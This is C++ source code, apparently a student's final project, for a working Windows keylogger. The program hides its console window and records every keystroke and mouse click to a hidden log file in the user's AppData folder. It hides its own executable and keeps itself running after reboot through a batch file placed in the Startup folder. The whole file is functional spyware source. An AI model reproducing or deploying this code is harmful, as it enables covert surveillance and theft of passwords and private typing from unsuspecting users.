// ConsoleApplication2.cpp : Defines the entry point for the console application.
//
// CS492-01
// Final Project
// By Jimmy Phasouk

// windows.h is used for the GetAsyncKeyState, SetFileAttributes, GetFullPathName, GetUserNameA
#include <windows.h>
// Lmcons.h is used for UNLEN 
#include <Lmcons.h>
#include <fstream>
#include <iostream>
#include <string>
#include <stdlib.h>

using namespace std;


int main()
{
	// this command will hide the CLI console window when the progam executes
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	// Key is used as the variable to determine which key is being pressed
	int Key = 0;
	char input;

	// Shift and ESC are constants to determine the program termination 
	const int	Shift = 160; // specifically let shift
	const int ESC = 27;

	// creates variables to hold the name of the current user logged in
	char user[UNLEN + 1];
	DWORD userLength = UNLEN + 1;
	// retrevies the name of the user logged in
	GetUserNameA(user, &userLength);
	cout << user << " is he current logged in user.\n";

	
	// creates a string variable to hold the path to the log file
	string logPath = "c:\\Users\\";
	// specifically places it in the current users AppData folder
	logPath = logPath + user;
	// creates a string variable to hold the path to the users startup folder
	string startFolder = logPath;
	// finalizes the pahts
	logPath = logPath + "\\AppData\\Local\\LogFile.txt";
	// creates a string for the directory of the startup folder
	startFolder = startFolder + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
	// adds to the folder the batch file
	string startBat = startFolder + "\\StartingBat.bat";

	// creates a file stream object log to output to the text file
	fstream log(logPath);

	// variable path with the maximum allowed character limit
	TCHAR exePath[MAX_PATH];

	// initializes a string to retreve the path of the executable file from the logfile to use later in the program
	string strPath;

	// used to change the registry
	//HKEY hkey = NULL;
	//RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key  

	// if the log file does not exist make it
	if (!log)
	{
		// retrevies the full directory path of the exe file
		GetFullPathName("KeyLogger.exe", MAX_PATH, exePath, NULL);
		//strPath = exePath;

		// creates and opens ths text file, appending to the file and closing the stream
		log.open(logPath, ios::app);
		//  puts the path of the executable as the first line in the text file
		log << exePath << "\nKey Logger has started!\n";
		log.close();
		cout << "Logfile has been created and keylogger in now recording keypresses.\n";

		// adds the exe to the registry startup
		//RegSetValueEx(hkey, "KeyLogger", 0, REG_SZ, (BYTE*)exePath, (strPath.size() + 1) * sizeof(wchar_t));
	}
	else
	{
		log.open(logPath, ios::app);
		log << endl << "the computer has restarted\n";
		log.close();
		cout << "the computer has restarted\n";
	}



	ifstream startFile(startBat);
	if (!startFile)
	{
		// makes the exe file hidden
		SetFileAttributes(exePath, FILE_ATTRIBUTE_HIDDEN);
		cout << "exe file is now a hidden file.\n";

		// creates a batch file in the startup folder to start the keylogger at startup
		cout << "There is no batch file to start the keylogger on startup.\n";
		fstream batFile(startBat);

		SetFileAttributesA(startFolder.c_str(), FILE_ATTRIBUTE_NORMAL);

		batFile.open(startBat, ios::app);
		//batFile << "@ECHO OFF\nECHO Starting the ViewableKeyLogger.exe\nSTART " << path << "\nPAUSE";
		batFile << "@ECHO OFF\nSTART " << exePath;
		batFile.close();
		cout << "bat file has been created in the startup folder.\n";
	}

	// gets the path of the executable from the first line of the log file
	log.open(logPath, ios::in);
	getline(log, strPath, '\n');
	cout << strPath << " this is the path of the exe\n";
	log.close();

	// changes the attribute of the file to a hidden file
	SetFileAttributes(logPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
	//SetFileAttributes(strPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
	SetFileAttributes(exePath, FILE_ATTRIBUTE_HIDDEN);
	cout << "logfile and exe are now hidden.\n";

	// this loop gets the key that was pressed
	while (true)
	{
		// if the key was pressed the returned value is < 0 
		if (GetAsyncKeyState(Key) == -32767)
		{
			// if the key was a left mouse click key == 0x01
			if (Key == VK_LBUTTON)
			{
				// outputs message when pressed to the CLI console window
				cout << " [Left_Click] ";
				// opens a stream to the text file to append
				log.open(logPath, ios::app);
				// appends the key press to the log text file
				log << " [Left_Click] ";
				// closes the stream
				log.close();
			}
			// if the key was a right mouse click 0x02
			else if (Key == VK_RBUTTON)
			{
				// outputs to console window and appends to file
				cout << " [Right_Click] ";
				log.open(logPath, ios::app);
				log << " [Right_Click] ";
				log.close();
			}
			// if the key was backspace 0x08
			else if (Key == VK_BACK)
			{
				// outputs to console window and appends to file
				cout << " [Backspace] ";
				log.open(logPath, ios::app);
				log << " [Backspace] ";
				log.close();
			}
			// if the key was tab 0x09
			else if (Key == VK_TAB)
			{
				// outputs to console window and appends to file
				cout << " 	 ";
				log.open(logPath, ios::app);
				log << " 	 ";
				log.close();
			}
			// if the key was enter 0x0d
			else if (Key == VK_RETURN)
			{
				// outputs to console window and appends to file
				cout << " [Enter] ";
				log.open(logPath, ios::app);
				log << " [Enter] ";
				log.close();
			}
			// if key was a shift key 0x10
			else if (Key == VK_SHIFT)
			{
				// outputs to console window and appends to file
				cout << " [Shift] ";
				log.open(logPath, ios::app);
				log << " [Shift] ";
				log.close();
			}
			// if the key was a CTRL key 0x11
			else if (Key == VK_CONTROL)
			{
				// outputs to console window and appends to file
				cout << "[CTRL] ";
				log.open(logPath, ios::app);
				log << "[CTRL] ";
				log.close();
			}
			// if the key was the ALT key 0x12
			else if (Key == VK_MENU)
			{
				// outputs to console window and appends to file
				cout << " [ALT] ";
				log.open(logPath, ios::app);
				log << " [ALT] ";
				log.close();
			}
			// if the key was the caps lock key 0x14
			else if (Key == VK_CAPITAL)
			{
				// outputs to console window and appends to file
				cout << " [CAPS] ";
				log.open(logPath, ios::app);
				log << " [CAPS] ";
				log.close();
			}
			// if the key was the ESC key 0x1b
			else if (Key == VK_ESCAPE)
			{
				// outputs to console window and appends to file
				cout << " [ESC] ";
				log.open(logPath, ios::app);
				log << " [ESC] ";
				log.close();
			}
			// if the key was the spacebar 0x20
			else if (Key == VK_SPACE)
			{
				// outputs to console window and appends to file
				cout << " ";
				log.open(logPath, ios::app);
				log << " ";
				log.close();
			}
			// if the key was the left arrow key 0x25
			else if (Key == VK_LEFT)
			{
				// outputs to console window and appends to file
				cout << " [Left_Arrow] ";
				log.open(logPath, ios::app);
				log << " [Left_Arrow] ";
				log.close();
			}
			// if teh key was the up arrow key 0x26
			else if (Key == VK_UP)
			{
				// outputs to console window and appends to file
				cout << " [Up_Arrow] ";
				log.open(logPath, ios::app);
				log << " [Up_Arrow] ";
				log.close();
			}
			// if the key was the right arrow key 0x27
			else if (Key == VK_RIGHT)
			{
				// outputs to console window and appends to file
				cout << " [Right_Arrow] ";
				log.open(logPath, ios::app);
				log << " [Right_Arrow] ";
				log.close();
			}
			// if the key was the down arrow key 0x28
			else if (Key == VK_DOWN)
			{
				// outputs to console window and appends to file
				cout << " [Down_Arrow] ";
				log.open(logPath, ios::app);
				log << " [Down_Arrow] ";
				log.close();
			}
			// if the key was the del key 0x2e
			else if (Key == VK_DELETE)
			{
				// outputs to console window and appends to file
				cout << " [DEL] ";
				log.open(logPath, ios::app);
				log << " [DEL] ";
				log.close();
			}
			// if the key was colon/semi-colon key 0xba
			else if (Key == 186)
			{
				// outputs to console window and appends to file
				cout << " ; ";
				log.open(logPath, ios::app);
				log << " ; ";
				log.close();
			}
			// if the key was the plus/equal key 0xbb
			else if (Key == 187)
			{
				// outputs to console window and appends to file
				cout << " + ";
				log.open(logPath, ios::app);
				log << " + ";
				log.close();
			}
			// if the key was the ,/< key 0xbc
			else if (Key == 188)
			{
				// outputs to console window and appends to file
				cout << " , ";
				log.open(logPath, ios::app);
				log << " , ";
				log.close();
			}
			// if the key was -/_ key 0xbd
			else if (Key == 189)
			{
				// outputs to console window and appends to file
				cout << " - ";
				log.open(logPath, ios::app);
				log << " - ";
				log.close();
			}
			// if the key was ./> key 0xbe
			else if (Key == 190)
			{
				// outputs to console window and appends to file
				cout << " . ";
				log.open(logPath, ios::app);
				log << " . ";
				log.close();
			}
			// if the key was / ? key 0xbf
			else if (Key == 191)
			{
				// outputs to console window and appends to file
				cout << " / ";
				log.open(logPath, ios::app);
				log << " / ";
				log.close();
			}
			// if the key is `/~ key 0xc0
			else if (Key == 192)
			{
				// outputs to console window and appends to file
				cout << " ` ";
				log.open(logPath, ios::app);
				log << " ` ";
				log.close();
			}
			// if the key was [/{ key 0xdb
			else if (Key == 219)
			{
				// outputs to console window and appends to file
				cout << " [ ";
				log.open(logPath, ios::app);
				log << " [ ";
				log.close();
			}
			// if the key was \/| key 0xdc
			else if (Key == 220)
			{
				// outputs to console window and appends to file
				cout << " \\ ";
				log.open(logPath, ios::app);
				log << " \\ ";
				log.close();
			}
			// if the key was ]/} key 0xdd
			else if (Key == 221)
			{
				// outputs to console window and appends to file
				cout << " ] ";
				log.open(logPath, ios::app);
				log << " ] ";
				log.close();
			}
			// if the key was '/" key 0xde
			else if (Key == 222)
			{
				// outputs to console window and appends to file
				cout << " \' ";
				log.open(logPath, ios::app);
				log << " \' ";
				log.close();
			}
			// if the key pressed was not a special key type
			else
			{
				// outputs the key to the console window and appends to the text file, casts the int to a char so the letter is outputted
				cout << char(Key);
				log.open(logPath, ios::app);
				log << char(Key);
				log.close();
			}

			// if both left shift and esc id pressed terminate the program
			if (GetAsyncKeyState(Shift) < 0 && GetAsyncKeyState(ESC) < 0)
			{
				// closes the file stream
				log.close();
				// restores the console window to be viewable to user
				ShowWindow(GetConsoleWindow(), SW_RESTORE);
				// tells the user the program is closing and asks if they want to delete the batch and log files
				cout << "\nKeylogger is now terminating.\n";
				system("pause");
				cout << "\ndelete files? y/n: ";
				cin >> input;
				if (input == 'y')
				{
					//deletes the log file
					cout << "\nnow deleting logfile.\n";
					DeleteFileA(logPath.c_str());

					startFile.open(startBat, ios::app);
					startFile.close();
					DeleteFileA(startBat.c_str());

					// unhides the executable file of the keylogger so that the user can see it and delete it 
					SetFileAttributes(strPath.c_str(), FILE_ATTRIBUTE_NORMAL);

					// delete exe from startup registry
					//cout << "\nnow deleting registry value\n";
					//RegDeleteValue(hkey, "KeyLogger");
				}
				system("pause");
				// terminates the program
				exit(0);
			}
			// if both the shift and F1 key is pressed
			else if (GetAsyncKeyState(Shift) < 0 && GetAsyncKeyState(112) < 0)
			{
				// shows the console window to user
				ShowWindow(GetConsoleWindow(), SW_RESTORE);
				cout << "console should be viewable";
			}
			// if both the shift and the F2 key is pressed
			else if (GetAsyncKeyState(Shift) < 0 && GetAsyncKeyState(113) < 0)
			{
				// hides the console window from the user
				ShowWindow(GetConsoleWindow(), SW_HIDE);
				cout << "console should not be viewable";
			}
			// if both the shift and F3 key is pressed
			else if (GetAsyncKeyState(Shift) < 0 && GetAsyncKeyState(114) < 0)
			{
				// sets the file's attributes to normal making them visable to the user
				SetFileAttributes(strPath.c_str(), FILE_ATTRIBUTE_NORMAL);
				SetFileAttributes(logPath.c_str(), FILE_ATTRIBUTE_NORMAL);
				cout << "Logfile and executable files are now viewable.\n";
			}
			// if both the shift and F4 key is pressed 
			else if (GetAsyncKeyState(Shift) < 0 && GetAsyncKeyState(115) < 0)
			{
				// set the files attributes to hidden so the user cannont see the files
				SetFileAttributes(strPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
				SetFileAttributes(logPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
				cout << "Logfile and executable files are now hidden.\n";
			}
		}

		// changes to the next key to view it's key state
		Key++;
		// keeps the key range between 0 and 254
		Key = Key % 255;
	}

	return 0;


}

